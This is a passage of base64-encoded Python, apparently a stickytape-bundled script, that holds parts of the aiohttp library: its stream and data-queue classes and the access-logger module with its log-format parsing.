Zmc2V0ID0gMFxyXG5cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBkYXRhID0gc2VsZi5fYnVmZmVyLnBvcGxlZnQoKVxyXG5cclxuICAgICAgICBzZWxmLl9zaXplIC09IGxlbihkYXRhKVxyXG4gICAgICAgIHNlbGYuX2N1cnNvciArPSBsZW4oZGF0YSlcclxuXHJcbiAgICAgICAgY2h1bmtfc3BsaXRzID0gc2VsZi5faHR0cF9jaHVua19zcGxpdHNcclxuICAgICAgICAjIFByZXZlbnQgbWVtb3J5IGxlYWs6IGRyb3AgdXNlbGVzcyBjaHVuayBzcGxpdHNcclxuICAgICAgICB3aGlsZSBjaHVua19zcGxpdHMgYW5kIGNodW5rX3NwbGl0c1swXSA8IHNlbGYuX2N1cnNvcjpcclxuICAgICAgICAgICAgY2h1bmtfc3BsaXRzLnBvcCgwKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9zaXplIDwgc2VsZi5fbG93X3dhdGVyIGFuZCBzZWxmLl9wcm90b2NvbC5fcmVhZGluZ19wYXVzZWQ6XHJcbiAgICAgICAgICAgIHNlbGYuX3Byb3RvY29sLnJlc3VtZV9yZWFkaW5nKClcclxuICAgICAgICByZXR1cm4gZGF0YVxyXG5cclxuICAgIGRlZiBfcmVhZF9ub3dhaXQoc2VsZiwgbjogaW50KSAtPiBieXRlczpcclxuICAgICAgICAiIiJSZWFkIG5vdCBtb3JlIHRoYW4gbiBieXRlcywgb3Igd2hvbGUgYnVmZmVyIGlmIG4gPT0gLTEiIiJcclxuICAgICAgICBjaHVua3MgPSBbXVxyXG5cclxuICAgICAgICB3aGlsZSBzZWxmLl9idWZmZXI6XHJcbiAgICAgICAgICAgIGNodW5rID0gc2VsZi5fcmVhZF9ub3dhaXRfY2h1bmsobilcclxuICAgICAgICAgICAgY2h1bmtzLmFwcGVuZChjaHVuaylcclxuICAgICAgICAgICAgaWYgbiAhPSAtMTpcclxuICAgICAgICAgICAgICAgIG4gLT0gbGVuKGNodW5rKVxyXG4gICAgICAgICAgICAgICAgaWYgbiA9PSAwOlxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcblxyXG4gICAgICAgIHJldHVybiBiIiIuam9pbihjaHVua3MpIGlmIGNodW5rcyBlbHNlIGIiIlxyXG5cclxuXHJcbmNsYXNzIEVtcHR5U3RyZWFtUmVhZGVyKFN0cmVhbVJlYWRlcik6ICAjIGxndG0gW3B5L21pc3NpbmctY2FsbC10by1pbml0XVxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgcGFzc1xyXG5cclxuICAgIGRlZiBleGNlcHRpb24oc2VsZikgLT4gT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl06XHJcbiAgICAgICAgcmV0dXJuIE5vbmVcclxuXHJcbiAgICBkZWYgc2V0X2V4Y2VwdGlvbihzZWxmLCBleGM6IEJhc2VFeGNlcHRpb24pIC0+IE5vbmU6XHJcbiAgICAgICAgcGFzc1xyXG5cclxuICAgIGRlZiBvbl9lb2Yoc2VsZiwgY2FsbGJhY2s6IENhbGxhYmxlW1tdLCBOb25lXSkgLT4gTm9uZTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGNhbGxiYWNrKClcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uOlxyXG4gICAgICAgICAgICBpbnRlcm5hbF9sb2dnZXIuZXhjZXB0aW9uKCJFeGNlcHRpb24gaW4gZW9mIGNhbGxiYWNrIilcclxuXHJcbiAgICBkZWYgZmVlZF9lb2Yoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBwYXNzXHJcblxyXG4gICAgZGVmIGlzX2VvZihzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgZGVmIGF0X2VvZihzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgYXN5bmMgZGVmIHdhaXRfZW9mKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgZGVmIGZlZWRfZGF0YShzZWxmLCBkYXRhOiBieXRlcywgbjogaW50ID0gMCkgLT4gTm9uZTpcclxuICAgICAgICBwYXNzXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlYWRsaW5lKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBiIiJcclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZChzZWxmLCBuOiBpbnQgPSAtMSkgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIGIiIlxyXG5cclxuICAgICMgVE9ETyBhZGQgYXN5bmMgZGVmIHJlYWR1bnRpbFxyXG5cclxuICAgIGFzeW5jIGRlZiByZWFkYW55KHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBiIiJcclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZGNodW5rKHNlbGYpIC0+IFR1cGxlW2J5dGVzLCBib29sXTpcclxuICAgICAgICByZXR1cm4gKGIiIiwgVHJ1ZSlcclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZGV4YWN0bHkoc2VsZiwgbjogaW50KSAtPiBieXRlczpcclxuICAgICAgICByYWlzZSBhc3luY2lvLkluY29tcGxldGVSZWFkRXJyb3IoYiIiLCBuKVxyXG5cclxuICAgIGRlZiByZWFkX25vd2FpdChzZWxmLCBuOiBpbnQgPSAtMSkgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIGIiIlxyXG5cclxuXHJcbkVNUFRZX1BBWUxPQUQ6IEZpbmFsW1N0cmVhbVJlYWRlcl0gPSBFbXB0eVN0cmVhbVJlYWRlcigpXHJcblxyXG5cclxuY2xhc3MgRGF0YVF1ZXVlKEdlbmVyaWNbX1RdKTpcclxuICAgICIiIkRhdGFRdWV1ZSBpcyBhIGdlbmVyYWwtcHVycG9zZSBibG9ja2luZyBxdWV1ZSB3aXRoIG9uZSByZWFkZXIuIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGxvb3A6IGFzeW5jaW8uQWJzdHJhY3RFdmVudExvb3ApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fbG9vcCA9IGxvb3BcclxuICAgICAgICBzZWxmLl9lb2YgPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuX3dhaXRlciA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbYXN5bmNpby5GdXR1cmVbTm9uZV1dXHJcbiAgICAgICAgc2VsZi5fZXhjZXB0aW9uID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXVxyXG4gICAgICAgIHNlbGYuX3NpemUgPSAwXHJcbiAgICAgICAgc2VsZi5fYnVmZmVyID0gY29sbGVjdGlvbnMuZGVxdWUoKSAgIyB0eXBlOiBEZXF1ZVtUdXBsZVtfVCwgaW50XV1cclxuXHJcbiAgICBkZWYgX19sZW5fXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLl9idWZmZXIpXHJcblxyXG4gICAgZGVmIGlzX2VvZihzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9lb2ZcclxuXHJcbiAgICBkZWYgYXRfZW9mKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2VvZiBhbmQgbm90IHNlbGYuX2J1ZmZlclxyXG5cclxuICAgIGRlZiBleGNlcHRpb24oc2VsZikgLT4gT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2V4Y2VwdGlvblxyXG5cclxuICAgIGRlZiBzZXRfZXhjZXB0aW9uKHNlbGYsIGV4YzogQmFzZUV4Y2VwdGlvbikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9lb2YgPSBUcnVlXHJcbiAgICAgICAgc2VsZi5fZXhjZXB0aW9uID0gZXhjXHJcblxyXG4gICAgICAgIHdhaXRlciA9IHNlbGYuX3dhaXRlclxyXG4gICAgICAgIGlmIHdhaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fd2FpdGVyID0gTm9uZVxyXG4gICAgICAgICAgICBzZXRfZXhjZXB0aW9uKHdhaXRlciwgZXhjKVxyXG5cclxuICAgIGRlZiBmZWVkX2RhdGEoc2VsZiwgZGF0YTogX1QsIHNpemU6IGludCA9IDApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fc2l6ZSArPSBzaXplXHJcbiAgICAgICAgc2VsZi5fYnVmZmVyLmFwcGVuZCgoZGF0YSwgc2l6ZSkpXHJcblxyXG4gICAgICAgIHdhaXRlciA9IHNlbGYuX3dhaXRlclxyXG4gICAgICAgIGlmIHdhaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fd2FpdGVyID0gTm9uZVxyXG4gICAgICAgICAgICBzZXRfcmVzdWx0KHdhaXRlciwgTm9uZSlcclxuXHJcbiAgICBkZWYgZmVlZF9lb2Yoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9lb2YgPSBUcnVlXHJcblxyXG4gICAgICAgIHdhaXRlciA9IHNlbGYuX3dhaXRlclxyXG4gICAgICAgIGlmIHdhaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fd2FpdGVyID0gTm9uZVxyXG4gICAgICAgICAgICBzZXRfcmVzdWx0KHdhaXRlciwgTm9uZSlcclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZChzZWxmKSAtPiBfVDpcclxuICAgICAgICBpZiBub3Qgc2VsZi5fYnVmZmVyIGFuZCBub3Qgc2VsZi5fZW9mOlxyXG4gICAgICAgICAgICBhc3NlcnQgbm90IHNlbGYuX3dhaXRlclxyXG4gICAgICAgICAgICBzZWxmLl93YWl0ZXIgPSBzZWxmLl9sb29wLmNyZWF0ZV9mdXR1cmUoKVxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLl93YWl0ZXJcclxuICAgICAgICAgICAgZXhjZXB0IChhc3luY2lvLkNhbmNlbGxlZEVycm9yLCBhc3luY2lvLlRpbWVvdXRFcnJvcik6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl93YWl0ZXIgPSBOb25lXHJcbiAgICAgICAgICAgICAgICByYWlzZVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9idWZmZXI6XHJcbiAgICAgICAgICAgIGRhdGEsIHNpemUgPSBzZWxmLl9idWZmZXIucG9wbGVmdCgpXHJcbiAgICAgICAgICAgIHNlbGYuX3NpemUgLT0gc2l6ZVxyXG4gICAgICAgICAgICByZXR1cm4gZGF0YVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2V4Y2VwdGlvbiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIHNlbGYuX2V4Y2VwdGlvblxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgRW9mU3RyZWFtXHJcblxyXG4gICAgZGVmIF9fYWl0ZXJfXyhzZWxmKSAtPiBBc3luY1N0cmVhbUl0ZXJhdG9yW19UXTpcclxuICAgICAgICByZXR1cm4gQXN5bmNTdHJlYW1JdGVyYXRvcihzZWxmLnJlYWQpXHJcblxyXG5cclxuY2xhc3MgRmxvd0NvbnRyb2xEYXRhUXVldWUoRGF0YVF1ZXVlW19UXSk6XHJcbiAgICAiIiJGbG93Q29udHJvbERhdGFRdWV1ZSByZXN1bWVzIGFuZCBwYXVzZXMgYW4gdW5kZXJseWluZyBzdHJlYW0uXHJcblxyXG4gICAgSXQgaXMgYSBkZXN0aW5hdGlvbiBmb3IgcGFyc2VkIGRhdGEuXHJcbiAgICAiIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgcHJvdG9jb2w6IEJhc2VQcm90b2NvbCwgbGltaXQ6IGludCwgKiwgbG9vcDogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18obG9vcD1sb29wKVxyXG5cclxuICAgICAgICBzZWxmLl9wcm90b2NvbCA9IHByb3RvY29sXHJcbiAgICAgICAgc2VsZi5fbGltaXQgPSBsaW1pdCAqIDJcclxuXHJcbiAgICBkZWYgZmVlZF9kYXRhKHNlbGYsIGRhdGE6IF9ULCBzaXplOiBpbnQgPSAwKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuZmVlZF9kYXRhKGRhdGEsIHNpemUpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX3NpemUgPiBzZWxmLl9saW1pdCBhbmQgbm90IHNlbGYuX3Byb3RvY29sLl9yZWFkaW5nX3BhdXNlZDpcclxuICAgICAgICAgICAgc2VsZi5fcHJvdG9jb2wucGF1c2VfcmVhZGluZygpXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlYWQoc2VsZikgLT4gX1Q6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICByZXR1cm4gYXdhaXQgc3VwZXIoKS5yZWFkKClcclxuICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICBpZiBzZWxmLl9zaXplIDwgc2VsZi5fbGltaXQgYW5kIHNlbGYuX3Byb3RvY29sLl9yZWFkaW5nX3BhdXNlZDpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3Byb3RvY29sLnJlc3VtZV9yZWFkaW5nKClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvd2ViX2xvZy5weScsIGInaW1wb3J0IGRhdGV0aW1lXHJcbmltcG9ydCBmdW5jdG9vbHNcclxuaW1wb3J0IGxvZ2dpbmdcclxuaW1wb3J0IG9zXHJcbmltcG9ydCByZVxyXG5mcm9tIGNvbGxlY3Rpb25zIGltcG9ydCBuYW1lZHR1cGxlXHJcbmZyb20gdHlwaW5nIGltcG9ydCBBbnksIENhbGxhYmxlLCBEaWN0LCBJdGVyYWJsZSwgTGlzdCwgVHVwbGUgICMgbm9xYVxyXG5cclxuZnJvbSAuYWJjIGltcG9ydCBBYnN0cmFjdEFjY2Vzc0xvZ2dlclxyXG5mcm9tIC53ZWJfcmVxdWVzdCBpbXBvcnQgQmFzZVJlcXVlc3RcclxuZnJvbSAud2ViX3Jlc3BvbnNlIGltcG9ydCBTdHJlYW1SZXNwb25zZVxyXG5cclxuS2V5TWV0aG9kID0gbmFtZWR0dXBsZSgiS2V5TWV0aG9kIiwgImtleSBtZXRob2QiKVxyXG5cclxuXHJcbmNsYXNzIEFjY2Vzc0xvZ2dlcihBYnN0cmFjdEFjY2Vzc0xvZ2dlcik6XHJcbiAgICAiIiJIZWxwZXIgb2JqZWN0IHRvIGxvZyBhY2Nlc3MuXHJcblxyXG4gICAgVXNhZ2U6XHJcbiAgICAgICAgbG9nID0gbG9nZ2luZy5nZXRMb2dnZXIoInNwYW0iKVxyXG4gICAgICAgIGxvZ19mb3JtYXQgPSAiJWEgJXtVc2VyLUFnZW50fWkiXHJcbiAgICAgICAgYWNjZXNzX2xvZ2dlciA9IEFjY2Vzc0xvZ2dlcihsb2csIGxvZ19mb3JtYXQpXHJcbiAgICAgICAgYWNjZXNzX2xvZ2dlci5sb2cocmVxdWVzdCwgcmVzcG9uc2UsIHRpbWUpXHJcblxyXG4gICAgRm9ybWF0OlxyXG4gICAgICAgICUlICBUaGUgcGVyY2VudCBzaWduXHJcbiAgICAgICAgJWEgIFJlbW90ZSBJUC1hZGRyZXNzIChJUC1hZGRyZXNzIG9mIHByb3h5IGlmIHVzaW5nIHJldmVyc2UgcHJveHkpXHJcbiAgICAgICAgJXQgIFRpbWUgd2hlbiB0aGUgcmVxdWVzdCB3YXMgc3RhcnRlZCB0byBwcm9jZXNzXHJcbiAgICAgICAgJVAgIFRoZSBwcm9jZXNzIElEIG9mIHRoZSBjaGlsZCB0aGF0IHNlcnZpY2VkIHRoZSByZXF1ZXN0XHJcbiAgICAgICAgJXIgIEZpcnN0IGxpbmUgb2YgcmVxdWVzdFxyXG4gICAgICAgICVzICBSZXNwb25zZSBzdGF0dXMgY29kZVxyXG4gICAgICAgICViICBTaXplIG9mIHJlc3BvbnNlIGluIGJ5dGVzLCBpbmNsdWRpbmcgSFRUUCBoZWFkZXJzXHJcbiAgICAgICAgJVQgIFRpbWUgdGFrZW4gdG8gc2VydmUgdGhlIHJlcXVlc3QsIGluIHNlY29uZHNcclxuICAgICAgICAlVGYgVGltZSB0YWtlbiB0byBzZXJ2ZSB0aGUgcmVxdWVzdCwgaW4gc2Vjb25kcyB3aXRoIGZsb2F0aW5nIGZyYWN0aW9uXHJcbiAgICAgICAgICAgIGluIC4wNmYgZm9ybWF0XHJcbiAgICAgICAgJUQgIFRpbWUgdGFrZW4gdG8gc2VydmUgdGhlIHJlcXVlc3QsIGluIG1pY3Jvc2Vjb25kc1xyXG4gICAgICAgICV7Rk9PfWkgIHJlcXVlc3QuaGVhZGVyc1tcJ0ZPT1wnXVxyXG4gICAgICAgICV7Rk9PfW8gIHJlc3BvbnNlLmhlYWRlcnNbXCdGT09cJ11cclxuICAgICAgICAle0ZPT31lICBvcy5lbnZpcm9uW1wnRk9PXCddXHJcblxyXG4gICAgIiIiXHJcblxyXG4gICAgTE9HX0ZPUk1BVF9NQVAgPSB7XHJcbiAgICAgICAgImEiOiAicmVtb3RlX2FkZHJlc3MiLFxyXG4gICAgICAgICJ0IjogInJlcXVlc3Rfc3RhcnRfdGltZSIsXHJcbiAgICAgICAgIlAiOiAicHJvY2Vzc19pZCIsXHJcbiAgICAgICAgInIiOiAiZmlyc3RfcmVxdWVzdF9saW5lIixcclxuICAgICAgICAicyI6ICJyZXNwb25zZV9zdGF0dXMiLFxyXG4gICAgICAgICJiIjogInJlc3BvbnNlX3NpemUiLFxyXG4gICAgICAgICJUIjogInJlcXVlc3RfdGltZSIsXHJcbiAgICAgICAgIlRmIjogInJlcXVlc3RfdGltZV9mcmFjIixcclxuICAgICAgICAiRCI6ICJyZXF1ZXN0X3RpbWVfbWljcm8iLFxyXG4gICAgICAgICJpIjogInJlcXVlc3RfaGVhZGVyIixcclxuICAgICAgICAibyI6ICJyZXNwb25zZV9oZWFkZXIiLFxyXG4gICAgfVxyXG5cclxuICAgIExPR19GT1JNQVQgPSBcJyVhICV0ICIlciIgJXMgJWIgIiV7UmVmZXJlcn1pIiAiJXtVc2VyLUFnZW50fWkiXCdcclxuICAgIEZPUk1BVF9SRSA9IHJlLmNvbXBpbGUociIlKFxceyhbQS1aYS16MC05XFwtX10rKVxcfShbaW9lXSl8W2F0UHJzYk9EXXxUZj8pIilcclxuICAgIENMRUFOVVBfUkUgPSByZS5jb21waWxlKHIiKCVbXnNdKSIpXHJcbiAgICBfRk9STUFUX0NBQ0hFID0ge30gICMgdHlwZTogRGljdFtzdHIsIFR1cGxlW3N0ciwgTGlzdFtLZXlNZXRob2RdXV1cclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgbG9nZ2VyOiBsb2dnaW5nLkxvZ2dlciwgbG9nX2Zvcm1hdDogc3RyID0gTE9HX0ZPUk1BVCkgLT4gTm9uZTpcclxuICAgICAgICAiIiJJbml0aWFsaXNlIHRoZSBsb2dnZXIuXHJcblxyXG4gICAgICAgIGxvZ2dlciBpcyBhIGxvZ2dlciBvYmplY3QgdG8gYmUgdXNlZCBmb3IgbG9nZ2luZy5cclxuICAgICAgICBsb2dfZm9ybWF0IGlzIGEgc3RyaW5nIHdpdGggYXBhY2hlIGNvbXBhdGlibGUgbG9nIGZvcm1hdCBkZXNjcmlwdGlvbi5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhsb2dnZXIsIGxvZ19mb3JtYXQ9bG9nX2Zvcm1hdClcclxuXHJcbiAgICAgICAgX2NvbXBpbGVkX2Zvcm1hdCA9IEFjY2Vzc0xvZ2dlci5fRk9STUFUX0NBQ0hFLmdldChsb2dfZm9ybWF0KVxyXG4gICAgICAgIGlmIG5vdCBfY29tcGlsZWRfZm9ybWF0OlxyXG4gICAgICAgICAgICBfY29tcGlsZWRfZm9ybWF0ID0gc2VsZi5jb21waWxlX2Zvcm1hdChsb2dfZm9ybWF0KVxyXG4gICAgICAgICAgICBBY2Nlc3NMb2dnZXIuX0ZPUk1BVF9DQUNIRVtsb2dfZm9ybWF0XSA9IF9jb21waWxlZF9mb3JtYXRcclxuXHJcbiAgICAgICAgc2VsZi5fbG9nX2Zvcm1hdCwgc2VsZi5fbWV0aG9kcyA9IF9jb21waWxlZF9mb3JtYXRcclxuXHJcbiAgICBkZWYgY29tcGlsZV9mb3JtYXQoc2VsZiwgbG9nX2Zvcm1hdDogc3RyKSAtPiBUdXBsZVtzdHIsIExpc3RbS2V5TWV0aG9kXV06XHJcbiAgICAgICAgIiIiVHJhbnNsYXRlIGxvZ19mb3JtYXQgaW50byBmb3JtIHVzYWJsZSBieSBtb2R1bG8gZm9ybWF0dGluZ1xyXG5cclxuICAgICAgICBBbGwga25vd24gYXRvbXMgd2lsbCBiZSByZXBsYWNlZCB3aXRoICVzXHJcbiAgICAgICAgQWxzbyBtZXRob2RzIGZvciBmb3JtYXR0aW5nIG9mIHRob3NlIGF0b21zIHdpbGwgYmUgYWRkZWQgdG9cclxuICAgICAgICBfbWV0aG9kcyBpbiBhcHByb3ByaWF0ZSBvcmRlclxyXG5cclxuICAgICAgICBGb3IgZXhhbXBsZSB3ZSBoYXZlIGxvZ19mb3JtYXQgPSAiJWEgJXQiXHJcbiAgICAgICAgVGhpcyBmb3JtYXQgd2lsbCBiZSB0cmFuc2xhdGVkIHRvICIlcyAlcyJcclxuICAgICAgICBBbHNvIGNvbnRlbnRzIG9mIF9tZXRob2RzIHdpbGwgYmVcclxuICAgICAgICBbc2VsZi5fZm9ybWF0X2EsIHNlbGYuX2Zvcm1hdF90XVxyXG4gICAgICAgIFRoZXNlIG1ldGhvZCB3aWxsIGJlIGNhbGxlZCBhbmQgcmVzdWx0cyB3aWxsIGJlIHBhc3NlZFxyXG4gICAgICAgIHRvIHRyYW5zbGF0ZWQgc3RyaW5nIGZvcm1hdC5cclxuXHJcbiAgICAgICAgRWFjaCBfZm9ybWF0XyogbWV0aG9kIHJlY2VpdmUgXCdhcmdzXCcgd2hpY2ggaXMgbGlzdCBvZiBhcmd1bWVudHNcclxuICAgICAgICBnaXZlbiB0byBzZWxmLmxvZ1xyXG5cclxuICAgICAgICBFeGNlcHRpb25zIGFyZSBfZm9ybWF0X2UsIF9mb3JtYXRfaSBhbmQgX2Zvcm1hdF9vIG1ldGhvZHMgd2hpY2hcclxuICAgICAgICBhbHNvIHJlY2VpdmUga2V5IG5hbWUgKGJ5IGZ1bmN0b29scy5wYXJ0aWFsKVxyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICAjIGxpc3Qgb2YgKGtleSwgbWV0aG9kKSB0dXBsZXMsIHdlIGRvblwndCB1c2UgYW4gT3JkZXJlZERpY3QgYXMgdXNlcnNcclxuICAgICAgICAjIGNhbiByZXBlYXQgdGhlIHNhbWUga2V5IG1vcmUgdGhhbiBvbmNlXHJcbiAgICAgICAgbWV0aG9kcyA9IGxpc3QoKVxyXG5cclxuICAgICAgICBmb3IgYXRvbSBpbiBzZWxmLkZPUk1BVF9SRS5maW5kYWxsKGxvZ19mb3JtYXQpOlxyXG4gICAgICAgICAgICBpZiBhdG9tWzFdID09ICIiOlxyXG4gICAgICAgICAgICAgICAgZm9ybWF0X2tleTEgPSBzZWxmLkxPR19GT1JNQVRfTUFQW2F0b21bMF1dXHJcbiAgICAgICAgICAgICAgICBtID0gZ2V0YXR0cihBY2Nlc3NMb2dnZXIsICJfZm9ybWF0XyVzIiAlIGF0b21bMF0pXHJcbiAgICAgICAgICAgICAgICBrZXlfbWV0aG9kID0gS2V5TWV0aG9kKGZvcm1hdF9rZXkxLCBtKVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgZm9ybWF0X2tleTIgPSAoc2VsZi5MT0dfRk9STUFUX01BUFthdG9tWzJdXSwgYXRvbVsxXSlcclxuICAgICAgICAgICAgICAgIG0gPSBnZXRhdHRyKEFjY2Vzc0xvZ2dlciwgIl9mb3JtYXRfJXMiICUgYXRvbVsyXSlcclxuICAgICAgICAgICAgICAgIGtleV9tZXRob2QgPSBLZXlNZXRob2QoZm9ybWF0X2tleTIsIGZ1bmN0b29scy5wYXJ0aWFsKG0sIGF0b21bMV0pKVxyXG5cclxuICAgICAgICAgICAgbWV0aG9kcy5hcHBlbmQoa2V5X21ldGhvZClcclxuXHJcbiAgICAgICAgbG9nX2Zvcm1hdCA9IHNlbGYuRk9STUFUX1JFLnN1YihyIiVzIiwgbG9nX2Zvcm1hdClcclxuICAgICAgICBsb2dfZm9ybWF0ID0gc2VsZi5DTEVBTlVQX1JFLnN1YihyIiVcXDEiLCBsb2dfZm9ybWF0KVxyXG4gICAgICAgIHJldHVybiBsb2dfZm9ybWF0LCBtZXRob2RzXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIF9mb3JtYXRfaShcclxuICAgICAgICBrZXk6IHN0ciwgcmVxdWVzdDogQmFzZVJlcXVlc3QsIHJlc3BvbnNlOiBTdHJlYW1SZXNwb25zZSwgdGltZTogZmxvYXRcclxuICAgICkgLT4gc3RyOlxyXG4gICAgICAgIGlmIHJlcXVlc3QgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmV0dXJuICIobm8gaGVhZGVycykiXHJcblxyXG4gICAgICAgICMgc3Vib3B0aW1hbCwgbWFrZSBpc3RyKGtleSkgb25jZVxyXG4gICAgICAgIHJldHVybiByZXF1ZXN0LmhlYWRlcnMuZ2V0KGtleSwgIi0iKVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBfZm9ybWF0X28oXHJcbiAgICAgICAga2V5OiBzdHIsIHJlcXVlc3Q6IEJhc2VSZXF1ZXN0LCByZXNwb25zZTogU3RyZWFtUmVzcG9uc2UsIHRpbWU6IGZsb2F0XHJcbiAgICApIC0+IHN0cjpcclxuICAgICAgICAjIHN1Ym9wdGltYWwsIG1ha2UgaXN0cihrZXkpIG9uY2VcclxuICAgICAgICByZXR1cm4gcmVzcG9uc2UuaGVhZGVycy5nZXQoa2V5LCAiLSIpXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIF9mb3JtYXRfYShyZXF1ZXN0OiBCYXNlUmVxdWVzdCwgcmVzcG9uc2U6IFN0cmVhbVJlc3BvbnNlLCB0aW1lOiBmbG9hdCkgLT4gc3RyOlxyXG4gICAgICAgIGlmIHJlcXVlc3QgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmV0dXJuICItIlxyXG4gICAgICAgIGlwID0gcmVxdWVzdC5yZW1vdGVcclxuICAgICAgICByZXR1cm4gaXAgaWYgaXAgaXMgbm90IE5vbmUgZWxzZSAiLSJcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgX2Zvcm1hdF90KHJlcXVlc3Q6IEJhc2VSZXF1ZXN0LCByZXNwb25zZTogU3RyZWFtUmVzcG9uc2UsIHRpbWU6IGZsb2F0KSAtPiBzdHI6XHJcbiAgICAgICAgbm93ID0gZGF0ZXRpbWUuZGF0ZXRpbWUudXRjbm93KClcclxuICAgICAgICBzdGFydF90aW1lID0gbm93IC0gZGF0ZXRpbWUudGltZWRlbHRhKHNlY29uZHM9dGltZSlcclxuICAgICAgICByZXR1cm4gc3RhcnRfdGltZS5zdHJmdGltZSgiWyVkLyViLyVZOiVIOiVNOiVTICswMDAwXSIpXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIF9mb3JtYXRfUChyZXF1ZXN0OiBCYXNlUmVxdWVzdCwgcmVzcG9uc2U6IFN0cmVhbVJlc3BvbnNlLCB0aW1lOiBmbG9hdCkgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPCVzPiIgJSBvcy5nZXRwaWQoKVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBfZm9ybWF0X3IocmVxdWVzdDogQmFzZVJlcXVlc3QsIHJlc3BvbnNlOiBTdHJlYW1SZXNwb25zZSwgdGltZTogZmxvYXQpIC0+IHN0cjpcclxuICAgICAgICBpZiByZXF1ZXN0IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiAiLSJcclxuICAgICAgICByZXR1cm4gInt9IHt9IEhUVFAve30ue30iLmZvcm1hdChcclxuICAgICAgICAgICAgcmVxdWVzdC5tZXRob2QsXHJcbiAgICAgICAgICAgIHJlcXVlc3QucGF0aF9xcyxcclxuICAgICAgICAgICAgcmVxdWVzdC52ZXJzaW9uLm1ham9yLFxyXG4gICAgICAgICAgICByZXF1ZXN0LnZlcnNpb24ubWlub3IsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBfZm9ybWF0X3MocmVxdWVzdDogQmFzZVJlcXVlc3QsIHJlc3BvbnNlOiBTdHJlYW1SZXNwb25zZSwgdGltZTogZmxvYXQpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gcmVzcG9uc2Uuc3RhdHVzXHJcblxyXG4gICAgQHN